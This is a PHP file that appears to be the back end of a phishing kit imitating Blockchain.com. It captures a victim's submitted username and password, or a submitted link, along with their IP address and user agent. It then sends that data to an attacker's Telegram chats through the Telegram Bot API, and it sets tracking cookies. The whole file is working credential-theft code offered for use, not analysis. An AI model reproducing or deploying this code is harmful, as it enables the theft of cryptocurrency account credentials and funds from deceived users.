<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 CUSTOM            $#
###############################################
**/
include '../../config/config.php';

if($_POST['content'] == 'main'){

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "<pre>Blockchain Info\n";
$message .= "NIF          : ".$_POST['user']."\n";
$message .= "Password        : ".$_POST['pass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "</pre>";
$praga=rand();
$praga=md5($praga);
$cliente = sha1(rand(1,999999));
setcookie('login', $cliente, time()+31536000,'/');
foreach ($chats_id as $chat_id) {
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . rawurlencode(($message))."&parse_mode=HTML" );
  }
}


if($_POST['content'] == 'link'){

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "<pre>Blockchain Info\n";
$message .= "LINK          : ".$_POST['link']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "</pre>";
$praga=rand();
$praga=md5($praga);
$cliente = sha1(rand(1,999999));
setcookie('link', $cliente, time()+31536000,'/');
foreach ($chats_id as $chat_id) {
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . rawurlencode(($message))."&parse_mode=HTML" );
  }
}
